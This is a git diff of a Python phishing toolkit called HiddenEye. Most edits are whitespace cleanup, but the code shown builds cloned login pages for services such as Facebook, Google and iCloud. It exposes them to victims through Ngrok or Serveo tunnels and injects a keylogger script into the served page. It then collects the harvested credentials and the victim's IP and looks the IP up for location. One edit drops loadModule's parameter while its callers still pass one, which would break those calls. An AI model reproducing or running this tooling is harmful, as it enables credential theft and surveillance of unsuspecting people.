@@ -69,7 +69,7 @@ def runPhishing(page , customOption): #Phishing pages selection menu
     elif customOption == '2' and page == 'Instagram':
         copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
     elif customOption == '3' and page == 'Instagram':
-        copy_tree("WebPages/Instagram_advanced_attack/", "Server/www/")    
+        copy_tree("WebPages/Instagram_advanced_attack/", "Server/www/")
     elif customOption == '1' and page == 'VK':
         copy_tree("WebPages/VK/", "Server/www/")
     elif customOption == '2' and page == 'VK':
@@ -82,7 +82,7 @@ def selectServer(): #Question where user must select server
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(RED, DEFAULT)) 
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(RED, DEFAULT))
         print(_("\n {0}[{1}!{0}]{0}SERVEO IS MORE ADVANCED THAN NGROK.\n {0}[{1}!{0}]{0}STILL ITS YOUR CHOICE{1}").format(RED, DEFAULT))
         print(_("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}").format(RED, DEFAULT))
         print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo").format(RED, DEFAULT))
@@ -90,7 +90,7 @@ def selectServer(): #Question where user must select server
         choice = input(" \n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
         system('clear')
         if choice == '1':
-            
+
             runNgrok()
         elif choice == '2':
             runServeo()
@@ -118,7 +118,7 @@ def runNgrok():
             break
 
 def runServeo():
-	
+
     print(_('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
@@ -146,10 +146,10 @@ def runServeo():
         print (_('''\n\n{0}FAILED !!!...{1}FAILED !!!..{0}FAILED !!!\n\n{0}[{1}!{0}]{0} Please Make Sure:\n{1} 1)~ If You are still connected to the Internet.\n 2)~ If You Have Chosen A {0}Valid{0}{1} Custom URL. \n     As Serveo Implemented More Security To Stop misuse of the service.\n 3)~ You Can Give another Try.\n\n\n{0}SCRIPT STOPPED {1}!! \n
 ''').format(RED, DEFAULT))
         exit(0)
-          
+
 
 def runMainMenu(): #menu where user select what they wanna use
-    
+
     if 256 != system('which php'): #Checking if user have PHP
         print (" -----------------------".format(CYAN, DEFAULT))
         print (_("[PHP INSTALLATION FOUND]").format(CYAN, DEFAULT))
@@ -167,7 +167,7 @@ def runMainMenu(): #menu where user select what they wanna use
     if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1})\n{2}HiddenEye >>> {1}").format(CYAN, DEFAULT, RED)).upper() != 'Y': #Question where user must accept education purposes
         system('clear')
         print (_('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n\n').format(RED, DEFAULT))
-        exit(0)        
+        exit(0)
 
     system('clear')
     print (_('''
@@ -189,7 +189,7 @@ def runMainMenu(): #menu where user select what they wanna use
                                              ''').format(GREEN, DEFAULT, CYAN, RED))
 
 
-    
+
     option = input(_("*************************\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n*************************\n {0}[{1}1{0}]{1} Facebook\n {0}[{1}2{0}]{1} Google\n {0}[{1}3{0}]{1} LinkedIn\n {0}[{1}4{0}]{1} GitHub\n {0}[{1}5{0}]{1} StackOverflow\n {0}[{1}6{0}]{1} WordPress\n {0}[{1}7{0}]{1} Twitter\n {0}[{1}8{0}]{1} Instagram\n {0}[{1}9{0}]{1} Snapchat\n {0}[{1}10{0}]{1} Yahoo\n {0}[{1}11{0}]{1} Twitch\n {0}[{1}12{0}]{1} Microsoft\n {0}[{1}13{0}]{1} Steam\n {0}[{1}14{0}]{1} VK\n {0}[{1}15{0}]{1} iCloud\n{0}HiddenEye >>>  {1}").format(RED, DEFAULT))
     if option == '1':
         loadModule('Facebook')
@@ -254,7 +254,7 @@ def runMainMenu(): #menu where user select what they wanna use
     else:
         exit(0)
 
-def loadModule(module): #This one just show text..
+def loadModule(): #This one just show text..
        print (_(''' {0}
  [{1}*{0}] module loaded. Building site...{0}\n--------------------------------''').format(RED, DEFAULT))
 
@@ -265,7 +265,7 @@ def inputCustom(): #Question where user can input custom web-link
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ]{1}!! {0}\n-------------------------------''').format(RED, DEFAULT))      
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ]{1}!! {0}\n-------------------------------''').format(RED, DEFAULT))
      print(_('''\n{1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)''').format(RED, DEFAULT))
      print(_('''\n{1}**{0}(Leave Blank To Loop The Phishing Page)''').format(RED, DEFAULT))
      print(_('''\n{0}[{1}/!\{0}]{0}Insert a custom redirect url:''').format(RED, DEFAULT))
@@ -303,7 +303,7 @@ def keyloggerprompt():
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC **
 ''').format(RED, DEFAULT))
-	print(_("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------").format(RED, DEFAULT))      
+	print(_("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------").format(RED, DEFAULT))
 
 def addingkeylogger():
      custom = input(_("\n{1}Do you want to Deploy a Keylogger against Victim{0}(Y/N) \n\n{0}YOUR CHOICE (Y/N) >>> {1}").format(RED, DEFAULT))
@@ -313,7 +313,7 @@ def addingkeylogger():
          c = read_data.replace('</title>', '</title><script src="keylogger.js"></script>')
          f = open('Server/www/index.html', 'w')
          f.write(c)
- 	
+
 def runServer():
     system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")
 
@@ -353,7 +353,7 @@ def getCredentials():
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
-                user = re.match('Current logged in user: (a-z0-9)\n', lines)
+                #user = re.match('Current logged in user: (a-z0-9)\n', lines) #Not used anywhere
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
